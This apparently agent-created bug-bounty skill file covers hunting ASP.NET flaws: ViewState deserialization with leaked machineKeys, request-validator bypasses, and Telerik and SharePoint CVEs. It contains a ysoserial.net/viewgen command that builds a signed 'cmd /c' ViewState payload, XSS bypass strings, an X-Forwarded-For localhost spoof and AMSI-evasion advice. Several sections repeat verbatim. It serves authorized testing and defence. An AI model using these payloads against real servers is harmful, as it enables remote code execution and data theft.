---
name: bbhunt-aspnet
description: "Hunt ViewState deserialization, machineKey recovery, request-validator bypass and debug endpoint exposure. Unified from 2 upstream skills (cbh, hunting). For authorized security testing only."
agent_created: true
---

# ASP.NET-specific vulnerability hunting — unified skill

> **Complete merged skill.** Everything from 2 upstream skills across cbh, hunting is contained in this file. Unmodified originals remain in `references/` for provenance only.

## Unified upstream methodology (complete, deduplicated)

### Discovery and hunting method

### Step-by-Step Hunting Methodology

1. **Fingerprint the framework version.** Trigger any 500 error (stale ViewState POST is a reliable way) and look for `Version Information: Microsoft .NET Framework Version:X.X.XXXXX; ASP.NET Version:X.X.XXXX.X` in the error body. This banner discloses both the runtime and ASP.NET-version-specific patch level. .NET 4.0.30319 + ASP.NET 4.8.x is the most common modern combination.

2. **Locate every form with `__VIEWSTATE`.** Spider the target and grep for `name="__VIEWSTATE"`. Each is a candidate sink for deserialization attacks if MAC / encryption is bypassable.

3. **Check `__VIEWSTATEENCRYPTED` value.** Empty (`value=""`) means ViewState is signed-only via `<machineKey>` but NOT encrypted. Recovery of the validation key → arbitrary deserialization. Non-empty (`value="something"`) means ViewState is BOTH signed and encrypted; both keys needed to forge.

4. **Test the ViewState parser-error differential** (the dual-parser anti-pattern). Send 7+ ViewState shapes and classify responses:
   - Trivial garbage (`AAAA`) → `"Validation of viewstate MAC failed"`
   - Real prefix from current page → `"Validation of viewstate MAC failed"`
   - Flipped-bit real ViewState → `"Validation of viewstate MAC failed"`
   - Oversize (`A * 100000`) → `"Validation of viewstate MAC failed"`
   - XML-shaped (`<xss/>`) → **"The state information is invalid for this page and might be corrupted"** ← different parser path
   - LosFormatter-style prefix (`/wEPDwUKMTcxNzgyOTQwMmRkkz9p4lzA...`) → **"The state information is invalid for this page and might be corrupted"**

   The differential proves there are **two distinct deserialization entry points**, one of which dispatches BEFORE the MAC check on some payload shapes. Historically this enables MAC-before-parse-bypass exploits.

5. **Look for load-balanced cross-node ViewState MAC failures.** If POST gets a 500 with `"Validation of viewstate MAC failed. If this application is hosted by a Web Farm or cluster, ensure that <machineKey> configuration specifies the same validationKey..."`, the farm has multiple WFEs WITHOUT machineKey sync, or without sticky-session affinity. Operationally this breaks legit users; security-wise it confirms farm topology.

6. **Probe `trace.axd` and `elmah.axd`.** If either returns 200 anonymously, it's a Critical finding (trace leaks every request + headers + form data; ELMAH leaks every server error including stack traces).

7. **Enumerate WCF services (`.svc`).** For each, fetch `?wsdl` and `?mex` (metadata exchange). MEX endpoints sometimes return full service contracts including admin operations.

8. **Test request-validator bypass.** ASP.NET's request validator blocks `<` in query strings by default. Bypass categories that may still get through:
   - HTML-entity-encoded payloads (`&lt;script&gt;` — but these don't execute)
   - Encoded inside JSON / XML POST bodies (different content-type ≠ same validator)
   - In path segments (not query) — validator scope depends on framework version
   - In Cookie / Referer headers (varies)
   - Inside `<%@ ... %>` ASP directives if reached via WebDAV PUT (rare)

9. **Check `customErrors` mode.** If 500s expose full stack traces, framework versions, file paths, internal method names → `customErrors mode="Off"` is set. Should be `RemoteOnly` for production.

10. **Look for Telerik components.** `Telerik.Web.UI.WebResource.axd?type=rau` is the historic upload-to-RCE chain (CVE-2017-11317). The `dialogParametersHolder` parameter chain (CVE-2019-18935) requires the encryption key but is otherwise RCE.

11. **SharePoint-specific deserialization paths** — see `sharepoint` skill for the ToolPane.aspx + anonymous FormDigest + unencrypted ViewState chain.

12. **SafeControl enumeration via reflection.** SharePoint's `Picker.aspx?PickerDialogType=<TypeName>` (and DNN-equivalent endpoints) accept class names and return DIFFERENT error messages for "type exists but not whitelisted" vs "type does not exist." Feed a wordlist of `Microsoft.SharePoint.*.WebControls.*` types to enumerate the SafeControl list — useful for CVE-2019-0604-family hunting.

---

### A. Discovery checklist — concrete fingerprints, endpoints, headers, CVEs to look for

- **Public/shared machineKey ecosystem (highest-value 2025–2026 signal).** Microsoft Threat Intelligence (Feb 2025) identified **3,000+ publicly disclosed ASP.NET machine keys** copied verbatim from docs/repos into production `web.config`; observed in-the-wild use to deliver the Godzilla / BLUEBEAM in-memory IIS web shell (Microsoft SHA-256 `19d87910d1a7ad9632161fd9dd6a54c8a059a64fc5f5a41cf5055cd37ec0499d`; Mandiant's `LoadLibrary.dll` variant `7c1f99dca8e5a7897892f9d224a6495023a2cfd2671697d229d355978c415ed2`). Any `<machineKey decryptionKey="..." validationKey="..."/>` you recover should be hashed and checked against Microsoft's exposed-key corpus (`aka.ms/exposed-machine-keys`). Known-key ViewState forging is now a mass-exploitation primitive, not just a stolen-secret scenario.
- **CVE-2026-5426 — KnowledgeDeliver (Digital Knowledge LMS, widely deployed in Japan).** Vendor-supplied `web.config` shipped an identical `machineKey` across every customer install (all deployments before 2026-02-24). Unauthenticated `__VIEWSTATE` deserialization → RCE, exploited as a zero-day. Fingerprint any ASP.NET LMS/vendor appliance whose install template hardcodes `<machineKey decryptionKey="..." validationKey="..."/>`; one leaked key compromises the whole fleet.
- **Telerik UI for ASP.NET AJAX** remains a prime sink: historic `GET /Telerik.Web.UI.WebResource.axd?type=rau` (CVE-2017-11317, CVE-2019-18935) plus newer **CVE-2025-3600** (CWE-470 unsafe reflection, CVSS 7.5, affects 2011.2.712–2025.1.218, fixed in 2025.1.416). Probe `GET /Telerik.Web.UI.WebResource.axd?type=iec&prtype=...`; Progress' own WAF mitigation blocks `type=iec`+`prtype`, any GET with a `Content-Type`, and URL-encoded `prtype` in query or cookie. Also track **CVE-2026-13181** (Telerik AJAX RCE, 2026 advisory).
- **Windows Event 1316 / Event code 4009** from source `ASP.NET 4.0.30319.0` in the Application log is the host-side fingerprint of ViewState exploitation: `"The viewstate supplied failed integrity check"` = attempt with a wrong key; `"Viewstate was invalid"` = integrity checks PASSED and deserialization was attempted (the success indicator). Mandiant decrypted the logged payload strings with the server's keys to recover the BLUEBEAM shell.
- **Anomalous concatenated User-Agent** — two complete browser UA strings joined together in one header — is a GTIG/Mandiant IOC for ViewState deserialization campaigns.
- **Post-exploitation IOCs to hunt:** `w3wp.exe` spawning `cmd.exe /c`, `whoami`, `powershell.exe`, or `icacls` (granting Everyone full control of the web root); JS file tampering injecting a "security authentication plugin" fake alert plus a remote script loader; in-memory `assembly.dll` / `LoadLibrary.dll` web shell with no file on disk.
- **Exchange overlap:** CVE-2020-0688 is the same fixed-crypto-key ViewState RCE class on OWA/ECP — include `/owa/`, `/ecp/` in the fingerprint sweep when the stack matches.
- **CVE-2025-53690 "WeepSteel" — Sitecore.** Same root pattern as KnowledgeDeliver: a static machine key shipped in vendor deployment guidance, reused across Sitecore XP installs, abused for unauthenticated ViewState deserialization and a backdoor web shell. Any Sitecore fingerprint (`/sitecore/`, `SC_ANALYTICS_GLOBAL_COOKIE`, `X-Scitemwebapi-Version`) plus a vendor-tEMPLATE key is a fleet-wide candidate.
- **Key-location checklist for grey-box review:** `web.config` at each vhost root, `machine.config` (`%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\Config\machine.config`), the app-pool identity registry hive when keys are auto-generated, and VSS snapshots of both. Microsoft's guidance explicitly calls out all four scopes — a key may exist in more than one.
- **Banner/version gate:** the 500-page banner `Version Information: Microsoft .NET Framework Version:4.0.30319; ASP.NET Version:4.8.xxxx.x` tells you whether AMSI (4.8+) is in play. `X-AspNet-Version` is absent on .NET Core/5+, so its absence plus `__VIEWSTATE` means classic framework anyway.
- **App-level key binding:** many apps set `<pages viewStateUserKey="...">` or a per-page `__VIEWSTATEGENERATOR`. A known machine key is necessary but not always sufficient — capture the generator from the target page and pass it to your signing tool, or the server rejects the MAC even with the right key.
- **Kudelski "persistent exploitation" pattern:** after ViewState RCE, actors drop disk-backed web shells alongside the in-memory one and deface JS assets. Hunt for newly written `.aspx`/`.js` under the web root with recent mtimes; this is often the only durable artifact.

### Step-by-Step Hunting Methodology

1. **Fingerprint the framework version.** Trigger any 500 error (stale ViewState POST is a reliable way) and look for `Version Information: Microsoft .NET Framework Version:X.X.XXXXX; ASP.NET Version:X.X.XXXX.X` in the error body. This banner discloses both the runtime and ASP.NET-version-specific patch level. .NET 4.0.30319 + ASP.NET 4.8.x is the most common modern combination.

2. **Locate every form with `__VIEWSTATE`.** Spider the target and grep for `name="__VIEWSTATE"`. Each is a candidate sink for deserialization attacks if MAC / encryption is bypassable.

3. **Check `__VIEWSTATEENCRYPTED` value.** Empty (`value=""`) means ViewState is signed-only via `<machineKey>` but NOT encrypted. Recovery of the validation key → arbitrary deserialization. Non-empty (`value="something"`) means ViewState is BOTH signed and encrypted; both keys needed to forge.

4. **Test the ViewState parser-error differential** (the dual-parser anti-pattern). Send 7+ ViewState shapes and classify responses:
   - Trivial garbage (`AAAA`) → `"Validation of viewstate MAC failed"`
   - Real prefix from current page → `"Validation of viewstate MAC failed"`
   - Flipped-bit real ViewState → `"Validation of viewstate MAC failed"`
   - Oversize (`A * 100000`) → `"Validation of viewstate MAC failed"`
   - XML-shaped (`<xss/>`) → **"The state information is invalid for this page and might be corrupted"** ← different parser path
   - LosFormatter-style prefix (`/wEPDwUKMTcxNzgyOTQwMmRkkz9p4lzA...`) → **"The state information is invalid for this page and might be corrupted"**

   The differential proves there are **two distinct deserialization entry points**, one of which dispatches BEFORE the MAC check on some payload shapes. Historically this enables MAC-before-parse-bypass exploits.

5. **Look for load-balanced cross-node ViewState MAC failures.** If POST gets a 500 with `"Validation of viewstate MAC failed. If this application is hosted by a Web Farm or cluster, ensure that <machineKey> configuration specifies the same validationKey..."`, the farm has multiple WFEs WITHOUT machineKey sync, or without sticky-session affinity. Operationally this breaks legit users; security-wise it confirms farm topology.

6. **Probe `trace.axd` and `elmah.axd`.** If either returns 200 anonymously, it's a Critical finding (trace leaks every request + headers + form data; ELMAH leaks every server error including stack traces).

7. **Enumerate WCF services (`.svc`).** For each, fetch `?wsdl` and `?mex` (metadata exchange). MEX endpoints sometimes return full service contracts including admin operations.

8. **Test request-validator bypass.** ASP.NET's request validator blocks `<` in query strings by default. Bypass categories that may still get through:
   - HTML-entity-encoded payloads (`&lt;script&gt;` — but these don't execute)
   - Encoded inside JSON / XML POST bodies (different content-type ≠ same validator)
   - In path segments (not query) — validator scope depends on framework version
   - In Cookie / Referer headers (varies)
   - Inside `<%@ ... %>` ASP directives if reached via WebDAV PUT (rare)

9. **Check `customErrors` mode.** If 500s expose full stack traces, framework versions, file paths, internal method names → `customErrors mode="Off"` is set. Should be `RemoteOnly` for production.

10. **Look for Telerik components.** `Telerik.Web.UI.WebResource.axd?type=rau` is the historic upload-to-RCE chain (CVE-2017-11317). The `dialogParametersHolder` parameter chain (CVE-2019-18935) requires the encryption key but is otherwise RCE.

11. **SharePoint-specific deserialization paths** — see `hunt-sharepoint` skill for the ToolPane.aspx + anonymous FormDigest + unencrypted ViewState chain.

12. **SafeControl enumeration via reflection.** SharePoint's `Picker.aspx?PickerDialogType=<TypeName>` (and DNN-equivalent endpoints) accept class names and return DIFFERENT error messages for "type exists but not whitelisted" vs "type does not exist." Feed a wordlist of `Microsoft.SharePoint.*.WebControls.*` types to enumerate the SafeControl list — useful for CVE-2019-0604-family hunting.

---

### Signals and surfaces

### Crown Jewel Targets

ASP.NET deserialization bugs pay among the highest amounts in bug bounty when they reach RCE. Even when patched, the disclosure-tier findings (signed-only ViewState, dual-parser differential, request-validator quirks) reliably pay Low-Medium.

**Highest-value targets:**

- **SharePoint farms** (any version — 2013/2016/2019/SE) — sign-only ViewState + permissive ToolPane.aspx + anonymous FormDigest creates the CVE-2025-53770 ToolShell precondition chain
- **Telerik UI for ASP.NET AJAX** — `Telerik.Web.UI.WebResource.axd` is a documented RCE sink when keys leak (CVE-2017-11317, CVE-2017-11357, CVE-2019-18935)
- **Classic ASP.NET Webforms enterprise apps** — banking portals, dealer portals, HR systems left on .NET Framework 4.x
- **WCF services** (`*.svc?WSDL`) — often forgotten admin endpoints with looser auth than the main app
- **Sitecore CMS** — ViewState + Sitecore-specific deserialization chains (CVE-2021-42237)
- **DotNetNuke (DNN)** — historic ViewState RCE chains
- **Umbraco CMS** — ViewState + custom deserialization sinks

**Asset types that pay most:** internet-reachable ASP.NET Webforms apps > WCF admin services > Telerik-integrated sites > Classic ASP.NET MVC with VSF (very rare)

---

### Attack Surface Signals

**Response headers indicating ASP.NET:**
```
X-AspNet-Version: 4.0.30319          (classic — disclosure on its own)
X-Powered-By: ASP.NET
X-AspNetMvc-Version: 5.2
Server: Microsoft-IIS/10.0
Set-Cookie: ASP.NET_SessionId=...
Set-Cookie: .ASPXAUTH=...            (Forms auth cookie)
Set-Cookie: .ASPXFORMSAUTH=...
Set-Cookie: ASP.NET_SessionId=...; SameSite=None  (suggests cross-origin embedding)
```

**Body signals (in form HTML):**
```
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="..." />
<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="..." />
<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="" />
                                        ↑ EMPTY = signed-only, not encrypted = exploitable if key leaks
<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="..." />
<input type="hidden" name="__REQUESTDIGEST" id="__REQUESTDIGEST" value="0x...,...">
                                        ↑ SharePoint CSRF token; if anon-issued, see sharepoint
```

**URL patterns to probe:**
```
/trace.axd                            (per-app trace viewer; sometimes anon-accessible)
/elmah.axd                            (ELMAH error log viewer)
/elmah.axd/?id=...                    (ELMAH RCE / stack-trace leak)
/*.svc                                (WCF services)
/*.svc?wsdl                           (WCF WSDL)
/*.svc/mex                            (Metadata Exchange)
/*.asmx                               (legacy SOAP)
/*.asmx?WSDL                          (legacy SOAP description)
/*.asmx?disco                         (legacy discovery)
/Telerik.Web.UI.WebResource.axd       (Telerik AJAX components)
/ChartImg.axd                         (DataVisualization controls; historic deserialization)
/ScriptResource.axd                   (script resource handler; sometimes leaks paths)
/WebResource.axd                      (web resource handler)
/_vti_bin/*                           (SharePoint Web Service Forwarder)
/api/                                 (Web API 2.x is ASP.NET on classic framework)
/signin                               (often FedAuth / WS-Federation)
```

**Tech-stack signals:**
- `Server: Microsoft-IIS/10.0` (or `/8.5`, `/7.5`) — confirmed Windows + IIS
- `X-AspNet-Version` header — classic .NET Framework (4.x); .NET Core/5+ does NOT emit this
- Cookies with `ASP.NET_SessionId`, `.ASPXAUTH`, `FedAuth` — Forms or claims auth
- `__VIEWSTATE` in form bodies — Webforms (NOT MVC, NOT Razor Pages, NOT Blazor)
- `MicrosoftSharePointTeamServices` header (sometimes stripped by ELB but leaks in `start.aspx` body) — SharePoint

---

### Attack Surface Signals

**Response headers indicating ASP.NET:**
```
X-AspNet-Version: 4.0.30319          (classic — disclosure on its own)
X-Powered-By: ASP.NET
X-AspNetMvc-Version: 5.2
Server: Microsoft-IIS/10.0
Set-Cookie: ASP.NET_SessionId=...
Set-Cookie: .ASPXAUTH=...            (Forms auth cookie)
Set-Cookie: .ASPXFORMSAUTH=...
Set-Cookie: ASP.NET_SessionId=...; SameSite=None  (suggests cross-origin embedding)
```

**Body signals (in form HTML):**
```
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="..." />
<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="..." />
<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="" />
                                        ↑ EMPTY = signed-only, not encrypted = exploitable if key leaks
<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="..." />
<input type="hidden" name="__REQUESTDIGEST" id="__REQUESTDIGEST" value="0x...,...">
                                        ↑ SharePoint CSRF token; if anon-issued, see hunt-sharepoint
```

**URL patterns to probe:**
```
/trace.axd                            (per-app trace viewer; sometimes anon-accessible)
/elmah.axd                            (ELMAH error log viewer)
/elmah.axd/?id=...                    (ELMAH RCE / stack-trace leak)
/*.svc                                (WCF services)
/*.svc?wsdl                           (WCF WSDL)
/*.svc/mex                            (Metadata Exchange)
/*.asmx                               (legacy SOAP)
/*.asmx?WSDL                          (legacy SOAP description)
/*.asmx?disco                         (legacy discovery)
/Telerik.Web.UI.WebResource.axd       (Telerik AJAX components)
/ChartImg.axd                         (DataVisualization controls; historic deserialization)
/ScriptResource.axd                   (script resource handler; sometimes leaks paths)
/WebResource.axd                      (web resource handler)
/_vti_bin/*                           (SharePoint Web Service Forwarder)
/api/                                 (Web API 2.x is ASP.NET on classic framework)
/signin                               (often FedAuth / WS-Federation)
```

**Tech-stack signals:**
- `Server: Microsoft-IIS/10.0` (or `/8.5`, `/7.5`) — confirmed Windows + IIS
- `X-AspNet-Version` header — classic .NET Framework (4.x); .NET Core/5+ does NOT emit this
- Cookies with `ASP.NET_SessionId`, `.ASPXAUTH`, `FedAuth` — Forms or claims auth
- `__VIEWSTATE` in form bodies — Webforms (NOT MVC, NOT Razor Pages, NOT Blazor)
- `MicrosoftSharePointTeamServices` header (sometimes stripped by ELB but leaks in `start.aspx` body) — SharePoint

---

### Techniques, payloads and bypasses

### Common Root Causes

1. **`viewStateEncryption="Auto"` defaults to signed-only on pages without sensitive ViewState data.** Many SharePoint pages are configured this way. When `__VIEWSTATEENCRYPTED` is empty, ViewState is signed-only — recovery of `validationKey` alone enables forgery.

2. **`<machineKey>` AutoGenerate in a Web Farm.** Each WFE generates a different key on first boot; ViewState issued by one WFE fails MAC validation on another. Operationally produces 500s; security-wise broadcasts the topology (the error message names the cluster).

3. **`<customErrors mode="Off">` left from development.** Stack traces with full method names, file paths, version banners exposed to anonymous internet users.

4. **`trace.axd` / `elmah.axd` left enabled in production.** Often forgotten in `<system.web><trace enabled="true">` blocks.

5. **Forgotten WCF `.svc` admin endpoints.** Built for internal admin tooling, never disabled when the main app went to internet exposure.

6. **Dual-parser anti-pattern: `ObjectStateFormatter` (legacy) vs `LosFormatter` (modern) deserialize in different orders relative to MAC validation.** Some payload shapes hit the legacy parser BEFORE MAC check.

7. **Request validator only applies to URL-encoded body and querystring.** Headers, cookies, XML/JSON bodies, and multipart fields are NOT validated by default. Developers assume validator is universal; it is not.

8. **`<machineKey>` checked into source repos.** Configuration check-ins to GitHub frequently leak validation/decryption keys. Combine with `misc` source-recon for Telerik / SharePoint / DNN keys.

9. **`SafeControls` web.config entries trusted to gate deserialization.** SharePoint's `<SafeControl>` list determines which classes Picker.aspx can instantiate. Bypasses exist when the inheritance check is the only gate (CVE-2019-0604 family).

---

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Trigger a stale/invalid ViewState POST to force the version banner and confirm `__VIEWSTATEENCRYPTED=""` (signed-only). When the deployed key is already public/shared, **skip key recovery entirely**: sign a malicious ViewState with `ysoserial.net` (`TypeConfuseDelegate` or `TextFormattingRunProperties`) using the known key and POST it as `__VIEWSTATE`. ASP.NET deserializes it in `w3wp.exe` before any app-level auth.
- Reuse the proven toolchain: `Blacklist3r` (recover keys from a candidate corpus) → `YSoSerial.Net` (build the .NET gadget) → `viewgen` (sign with validationKey / encrypt with decryptionKey). Chain primitive: `machineKey` leak from `web.config` disclosure, `elmah.axd`, GitHub/source recon, or vendor default → forged signed ViewState → RCE as app-pool identity.
- Dual-parser differential from the main methodology (XML-shaped `<xss/>` and LosFormatter-shaped `/wEPDwUK...` payloads reaching `ObjectStateFormatter` before MAC validation) is still a valid way to show *two* deserialization entry points; do not claim full RCE from the differential alone without a working key or gadget.
- Windows Event 4009 substring is a useful **oracle** in grey-box testing: submit your signed payload, then (where you have log access) check whether the reason string is `"failed integrity check"` (wrong key / blocked) or `"Viewstate was invalid"` (valid MAC, payload reached deserialization).
- Microsoft's hardening note: upgrading to **ASP.NET 4.8** enables AMSI, which detects in-memory Godzilla/BLUEBEAM assembly loads — so a default-key target on 4.8 may still fail to yield a usable shell even with a valid ViewState. Enumerate `X-AspNet-Version` / the 500-page banner before promising RCE.
- AES + HMAC keys are independent: a leaked `validationKey` alone forges signed-but-unencrypted ViewState; a non-empty `__VIEWSTATEENCRYPTED` requires both keys. Test each half separately and report the precise primitive.
- Configuration-file access monitoring (Event ID 4663 on `web.config` / `machine.config`) is a defender control, but for the tester it means a stolen key may already be in use by another actor — treat a confirmed public key on an internet-facing host as possible prior compromise, not just a misconfiguration.
- **Concrete toolchain invocation shape:** `viewgen --compatibility-mode 4.0 --validationkey <VAL> --decryptionkey <DEC> --validation HMACSHA256 --encryption AES --payload "$(ysoserial.net ... -g TypeConfuseDelegate -c 'cmd /c ...' -o base64)"` → POST the resulting base64 as `__VIEWSTATE` with the captured `__VIEWSTATEGENERATOR`, `__EVENTVALIDATION` and `ASP.NET_SessionId` from the same page. Missing any page-bound field is the most common reason a correct key appears to "fail."
- **Oracle without log access:** send three variants — (1) random base64, (2) your signed payload for a *different* page's generator, (3) signed payload for the *correct* page. Classify by status code, response length, and whether `customErrors` masks the reason. Variant 3 behaving differently from 1/2 is the acceptance signal even when the error text is generic.
- **AMSI bypass consideration:** on ASP.NET 4.8, in-memory Godzilla/BLUEBEAM assembly loads are flagged. A gadget that emits a DNS/HTTP callback via `System.Net.WebClient` or writes a short-lived file often survives where a full post-exploitation framework does not; use the least capability needed to prove execution.
- **Farm rotation bypass logic:** if the app is behind a load balancer without sticky sessions, a signed ViewState forged for one node may be rejected by another (the classic "ensure `<machineKey>` is identical across the farm" 500). Repeat the POST until it lands on the node whose key you have, or use a farm-consistent key — do not conclude "patched" from an intermittent MAC failure.

### Payload & Detection Patterns

**Stack-trace fingerprint (trigger via stale ViewState POST):**
```bash
curl -sk -X POST "https://target.example/page.aspx" \
  --data "__VIEWSTATE=AAAA&__VIEWSTATEGENERATOR=AAAA"
# Inspect body for:
#  - "Validation of viewstate MAC failed" → confirms signed ViewState
#  - "The state information is invalid for this page" → confirms ALTERNATE parser path
#  - "Version Information: Microsoft .NET Framework Version:X.X.XXXXX" → exact patch level
#  - "Microsoft.SharePoint.Client.ServerStub..." → SharePoint farm
```

**ViewState parser-error differential probe (Python):**
```python
import requests, re, json
S = requests.Session(); S.verify = False
# Get fresh form
r = S.get("https://target.example/path/page.aspx")
real_vs = re.search(r'__VIEWSTATE" id="__VIEWSTATE" value="([^"]+)', r.text).group(1)
real_vsg = re.search(r'__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="([^"]+)', r.text).group(1)

# Test 7 payload shapes
for label, vs in [
    ("trivial",      "AAAA"),
    ("real",         real_vs),
    ("flipped-bit",  real_vs[:50] + "X" + real_vs[51:]),
    ("oversize",     "A" * 100000),
    ("base64",       "VGVzdE1hcmtlcjY3OFhZWg=="),
    ("xml-shaped",   "<xss/>"),
    ("losformatter", "/wEPDwUKMTcxNzgyOTQwMmRkkz9p4lzA" + "A"*50),
]:
    r = S.post("https://target.example/path/page.aspx",
               data={"__VIEWSTATE": vs, "__VIEWSTATEGENERATOR": real_vsg})
    title = re.search(r'<title>([^<]+)</title>', r.text)
    title = title.group(1)[:100] if title else "—"
    print(f"  [{label:14s}] {r.status_code}  {title}")
```

**`trace.axd` anonymous check:**
```bash
curl -sk -o /dev/null -w "%{http_code}\n" "https://target.example/trace.axd"
# 200 = full trace dump exposed → Critical
# 403 = mod set to localhost-only → check via X-Forwarded-For: 127.0.0.1
```

**WCF service enumeration:**
```bash
# Find all .svc files
curl -sk "https://target.example/" -o body.html
grep -oE '/[a-zA-Z0-9/_-]+\.svc' body.html | sort -u
# For each found:
curl -sk "https://target.example/Service.svc?wsdl" | xmllint --format - | head -60
```

**Request-validator bypass categories:**
```
# Default: <script>alert(1)</script> in ?q= → "Potentially dangerous Request.QueryString value detected"
# Bypasses that sometimes work:
?q=%3cscript%3e            (URL-encoded — depends on validator config)
?q=<svg/onload=alert(1)>  (depends on validator version)
?q=<%00script>             (NUL-byte; older validators)
?q=javascript:alert(1)     (no < at all — passes validator)
Cookie: foo=<script>       (cookie body not validated by default)
Referer: http://x.com/<script>  (referer not validated in classic ASP.NET)
```

**Telerik exploit gate (CVE-2019-18935 — requires encryption keys):**
```bash
# Fingerprint Telerik
curl -sk "https://target.example/Telerik.Web.UI.WebResource.axd?type=rau" -X POST
# If response is RadAsyncUploadHandler-style → Telerik present; try keys
# Public exploits require leaked machineKey AND telerikEncryptionKey
```

---

### Common Root Causes

1. **`viewStateEncryption="Auto"` defaults to signed-only on pages without sensitive ViewState data.** Many SharePoint pages are configured this way. When `__VIEWSTATEENCRYPTED` is empty, ViewState is signed-only — recovery of `validationKey` alone enables forgery.

2. **`<machineKey>` AutoGenerate in a Web Farm.** Each WFE generates a different key on first boot; ViewState issued by one WFE fails MAC validation on another. Operationally produces 500s; security-wise broadcasts the topology (the error message names the cluster).

3. **`<customErrors mode="Off">` left from development.** Stack traces with full method names, file paths, version banners exposed to anonymous internet users.

4. **`trace.axd` / `elmah.axd` left enabled in production.** Often forgotten in `<system.web><trace enabled="true">` blocks.

5. **Forgotten WCF `.svc` admin endpoints.** Built for internal admin tooling, never disabled when the main app went to internet exposure.

6. **Dual-parser anti-pattern: `ObjectStateFormatter` (legacy) vs `LosFormatter` (modern) deserialize in different orders relative to MAC validation.** Some payload shapes hit the legacy parser BEFORE MAC check.

7. **Request validator only applies to URL-encoded body and querystring.** Headers, cookies, XML/JSON bodies, and multipart fields are NOT validated by default. Developers assume validator is universal; it is not.

8. **`<machineKey>` checked into source repos.** Configuration check-ins to GitHub frequently leak validation/decryption keys. Combine with `hunt-misc` source-recon for Telerik / SharePoint / DNN keys.

9. **`SafeControls` web.config entries trusted to gate deserialization.** SharePoint's `<SafeControl>` list determines which classes Picker.aspx can instantiate. Bypasses exist when the inheritance check is the only gate (CVE-2019-0604 family).

---

### Bypass Techniques

| Defense | Bypass |
|---|---|
| `__VIEWSTATEENCRYPTED` non-empty (encrypted) | Recover both decryption + validation keys from any source-code leak / config-disclosure / VS forge primitive; without keys, deserialization cannot be triggered |
| Request validator blocks `<` in querystring | Move payload to Cookie / Referer / JSON body / multipart filename — validator doesn't reach those contexts in classic ASP.NET |
| `EnableViewStateMac="true"` enforced | Recover `validationKey` from web.config disclosure or `<machineKey>` AutoGenerate fingerprinting (ysoserial.net `--minify --islegacy` mode generates ViewState that passes some MAC-validation gaps) |
| `trace.axd` localhost-only | Set `X-Forwarded-For: 127.0.0.1` if the trace mode is `localOnly` and the validation uses Request.UserHostAddress (some apps use Forwarded-For instead) |
| WCF `.svc` 401 on anonymous | Try `?wsdl` and `?mex` first; metadata is sometimes anonymously enumerable even when service ops require auth |
| Telerik upload patched | Check the Telerik version: anything pre-2017Q1 (build 2017.1.118 or earlier) is the original RAU RCE. Check 2017Q3 - 2019Q3 for CVE-2019-18935 |
| `SafeControl` whitelist enforced | Inheritance gate (`instanceof PickerDialog`) IS the gate on patched SP — bypass requires finding a SafeControl subclass with a deserialization sink; enumerate via Picker.aspx |
| `customErrors mode="On"` (no stack traces) | Force a different error path: invalid Content-Length, malformed ViewState that triggers a parser-level exception below the customErrors handler |

---

### Validation and proof

### Gate 0 Validation

Before writing the report, confirm:

1. **What can the attacker DO right now with the disclosed information?**
   - `trace.axd` 200 with full request dump → **Critical** (PII / session cookies / Authorization headers exposed)
   - `elmah.axd` 200 with error log → **High** (stack traces + internal paths + sometimes credentials)
   - `__VIEWSTATEENCRYPTED` empty + recoverable machineKey via separate finding → **Critical chain to RCE**
   - `__VIEWSTATEENCRYPTED` empty without key recovery → **Low-Medium** (primitive present, not exploitable on its own)
   - Stack traces in 500s → **Low** unless they include credentials / connection strings

2. **Have you reproduced the full chain to attacker-attainable impact, or only the primitive?**
   - Cross-reference `triage-validation` Pre-Severity Gate. "Primitive confirmed" is not Critical until the chain ends in impact.

3. **Can a triager reproduce in <10 min from your report?**
   - Each step copy-pasteable curl / Python.
   - For RCE chains: link the public exploit tool (ysoserial.net, viewgen, telerik-revda) and the specific gadget chain.

---

### C. Validation / proof bar — how to confirm and avoid false positives

- **Proof of exploitation = the payload executed**, not "a key was found." Acceptable: command output (`whoami`), a DNS/HTTP callback from the gadget, a shell child-process (`w3wp.exe` → `cmd.exe`), or Event 1316/4009 `"Viewstate was invalid"` paired with your unique marker.
- **Tier the finding honestly:** signed-only ViewState with no known key = Low–Medium primitive; publicly disclosed/known key plus accepted signed payload = Critical RCE; `trace.axd`/`elmah.axd` 200 with live credentials = Critical disclosure; bare stack traces = Low.
- **CVE-2025-3600 is a DoS**, not code execution — confirm an unhandled exception / app-pool recycle / 500 on the crafted `type=iec&prtype` request; do not grade it as RCE.
- Do **not** report a "blocked" response to a known-key ViewState POST as a patch confirmation without checking the Event 4009 reason string — AMSI, customErrors, or a WAF may alter the response while the underlying key remains usable.
- After confirming a publicly disclosed key was exploited, rotation alone is insufficient per Microsoft: web-facing servers should be fully investigated and strongly considered for offline reformat/reinstall, and machine keys rotated on **all** farm nodes using the same new values (or the `<machineKey>` element removed to revert to auto-generated keys).
- Every step must be reproducible by a triager in <10 min: include the exact `machineKey` (redacted), the ysoserial.net gadget, the signing command, the target URL, and the callback/output evidence.
- **Distinguish disclosure from RCE in the report title.** "Publicly disclosed machine key present in `web.config`" is a configuration finding; "unauthenticated ViewState deserialization RCE (verified with `id` output / callback)" is Critical. The 2025 Microsoft and 2026 Mandiant reports make the shared-key class unambiguous, but a triager still needs your accepted payload.
- **SharePoint boundary:** if the host is SharePoint, follow the `sharepoint` skill's ToolShell precondition chain. Per that research the machineKey is the *loot* dumped by the first web shell (`spinstall0.aspx`) and the persistence arm — it is **not** a gate in front of initial RCE. Do not under-assess an exploitable farm because you do not yet know its keys, and do not over-claim by delivering a malicious ViewState during authorized precondition testing.
